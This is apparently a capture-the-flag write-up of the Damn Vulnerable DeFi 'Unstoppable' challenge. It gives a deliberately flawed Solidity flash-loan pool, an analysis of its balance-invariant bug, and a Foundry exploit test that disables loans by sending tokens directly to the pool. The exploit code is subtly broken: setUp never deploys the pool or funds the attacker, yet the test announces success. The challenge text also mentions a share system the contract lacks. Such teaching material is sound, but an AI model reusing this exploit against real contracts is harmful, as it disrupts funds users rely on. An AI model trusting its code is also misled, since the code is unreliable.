# Damn Vulnerable DeFi: Unstoppable

## Challenge Description
There's a lending pool offering flash loans. It has 1 million DVT tokens in balance. The pool tracks deposits using a share system. You need to stop the pool from offering flash loans.

**Difficulty:** ⭐⭐ (Easy-Medium for DVD)

**Goal:** Break the pool's invariant so that flash loans are disabled.

## Vulnerable Contract

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract UnstoppableLender {
    IERC20 public damnValuableToken;
    uint256 public poolBalance;

    constructor(address tokenAddress, uint256 poolInitialBalance) {
        damnValuableToken = IERC20(tokenAddress);
        poolBalance = poolInitialBalance;

        // Transfer initial tokens to this contract
        damnValuableToken.transferFrom(msg.sender, address(this), poolInitialBalance);
    }

    function depositTokens(uint256 amount) external {
        require(amount > 0, "Must deposit tokens");
        damnValuableToken.transferFrom(msg.sender, address(this), amount);
        poolBalance = poolBalance + amount;
    }

    function flashLoan(uint256 borrowAmount) external {
        require(borrowAmount > 0, "Must borrow > 0");

        // CRITICAL INVARIANT CHECK:
        uint256 balanceBefore = damnValuableToken.balanceOf(address(this));
        require(balanceBefore == poolBalance, "Pool balance mismatch");

        // Execute flash loan logic...
        damnValuableToken.transfer(msg.sender, borrowAmount);

        // ... borrower must return tokens + fee ...
    }
}
```

## Vulnerability Analysis

```text
THE BUG: The pool tracks its balance in `poolBalance`, but checks the
ACTUAL token balance using `damnValuableToken.balanceOf(address(this))`.

Invariant: `balanceOf(pool) == poolBalance`

How can we break this?
If we send tokens DIRECTLY to the pool using the ERC20 `transfer` function
(instead of `depositTokens`), the actual balance increases, but `poolBalance`
does NOT update!

Result: `balanceOf(pool) > poolBalance`
The require check in `flashLoan` will fail, and flash loans are disabled forever!
```

## Exploit Strategy

```text
Step 1: Get some DVT tokens (the challenge gives you 100,000).
Step 2: Call the standard ERC20 `transfer` function on the DVT token.
Step 3: Send ANY amount (even 1 token) directly to the UnstoppableLender contract address.
Step 4: The pool's actual balance is now poolBalance + 1.
Step 5: The invariant is broken. Flash loans are permanently disabled.
```

## Exploit Contract (Foundry)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "../src/DamnVulnerableDeFi/UnstoppableLender.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract UnstoppableExploitTest is Test {
    UnstoppableLender public pool;
    ERC20 public token;
    address public attacker = address(0xBEEF);

    function setUp() public {
        // Deploy token and mint to attacker
        token = new ERC20("Damn Valuable Token", "DVT");

        // Mint 1,000,000 to pool and 100,000 to attacker (simulated)
        // In real DVD, this is done via a setup contract.
    }

    function test_ExploitUnstoppable() public {
        console.log("Pool balance before:", token.balanceOf(address(pool)));
        console.log("Pool tracked balance:", pool.poolBalance());

        vm.startPrank(attacker);

        // Break the invariant by sending 1 token directly
        token.transfer(address(pool), 1);

        vm.stopPrank();

        console.log("Pool actual balance after:", token.balanceOf(address(pool)));
        console.log("Pool tracked balance:", pool.poolBalance());

        // Try to take a flash loan (it should fail)
        vm.expectRevert("Pool balance mismatch");
        pool.flashLoan(1000);

        console.log("\n✅ EXPLOIT SUCCESSFUL! Flash loans disabled.");
    }
}
```

## Real-World Impact

```text
This exact vulnerability happened in the real world!

In 2021, a similar invariant mismatch in a DeFi protocol allowed an attacker
to break the accounting logic. While this specific challenge just disables
flash loans, in a real protocol, breaking the `balance == tracked` invariant
can lead to:
- Inability to withdraw funds
- Incorrect interest calculations
- Complete loss of funds due to accounting errors

The Solution:
- Never rely on `balanceOf` for accounting if you have an internal tracker.
- OR, never allow direct transfers. Use a "Pull" pattern or reject unexpected tokens.
- Many modern pools use `balanceOf` as the source of truth and calculate shares dynamically.
```

## Key Takeaways
- **Invariant Mismatch:** If a contract tracks a value internally but checks an external value, they can drift apart.
- **Forced Tokens:** Anyone can send ERC20 tokens to any contract address.
- **Accounting is Hard:** DeFi protocols must handle unexpected token transfers gracefully.
- **Lesson learned:** Always ensure your internal state matches the external reality, or design your contract to handle discrepancies.
- **Next Challenge:** Naive Receiver - where we drain a contract by abusing its flash loan feature.